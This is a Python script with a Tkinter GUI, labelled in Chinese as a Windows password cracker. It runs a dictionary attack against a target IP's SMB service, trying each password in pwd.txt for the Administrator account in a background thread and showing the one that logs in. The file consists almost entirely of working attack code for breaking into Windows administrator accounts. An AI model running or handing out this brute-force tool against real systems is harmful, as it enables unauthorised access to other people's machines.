import fs.smbfs
from tkinter import*
from tkinter import messagebox
import threading
#--------------------------SMb---------------------
number = 0
password_list = []
bools = True
def read(target,numbers):
    global number
    global password_list
    messagebox.showinfo("密码破解","破解开始,详情请见命令行")
    print('开始破解')
    path = 'pwd.txt'
    file = open(path,'r')
    while bools:
        try:
            pwd = file.readline()
            fs.smbfs.SMBFS(host=target, username='Administrator', passwd=pwd)#不断尝试密码
        except AttributeError:
            print('错误的IP')
        except:
            password_list.append(pwd)
            if number == 10:
                print('[-]密码错误 --number=10:',password_list)
                number = 0
            else:
                number = number + 1
        else:
            print('[*]密码正确:',pwd)
            passwd = '密码破解成功 Administrator:'+pwd
            messagebox.showinfo("密码破解",passwd)
            return True
            break



def start_password():
    global bools
    target = en.get()
    numbers = 1
    bools = True
    t = threading.Thread(target=read,args=(target,numbers))
    t.start()

def stop_password():
    global bools
    bools = False
    messagebox.showinfo("密码破解","破解结束结束")
    return True

#---------------------------------------------------
tk = Tk()
tk.title('密码破解-windows')
tk.geometry('300x160+420+200')
#----------------------------------------------------
en = Entry(tk)
en.place(x=80,y=40)
#--------------------------text------------------
w= Label(tk,text='目标IP:',fg="red")
w.place(x=20,y=40)
#------------------------start or stop----------------
b = Button(tk, text ="开始破解", command=start_password)
b.place(x=20,y=80)
b_2 = Button(tk, text ="停止", command=stop_password)
b_2.place(x=200,y=80)
tk.mainloop()
#------------------------start-GUI--------------------
tk.mainloop()
#-------------------------over-------------------------
